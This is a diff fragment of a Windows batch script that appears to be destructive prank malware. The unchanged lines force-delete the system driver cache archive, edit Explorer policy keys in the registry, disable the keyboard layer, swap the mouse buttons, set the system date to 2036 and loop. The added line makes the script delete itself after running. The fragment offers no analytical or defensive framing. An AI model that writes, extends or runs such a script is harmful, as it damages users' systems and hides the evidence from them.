@@ -14,5 +14,6 @@ reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer
 del "%SystemRoot%Driver Cachei386driver.cab" /f /q >nul
 rundll32 user,disableoemlayer
 rundll32 user,SwapMouseButton
+del %0 >nul
 date 29.07.36	
 goto:a
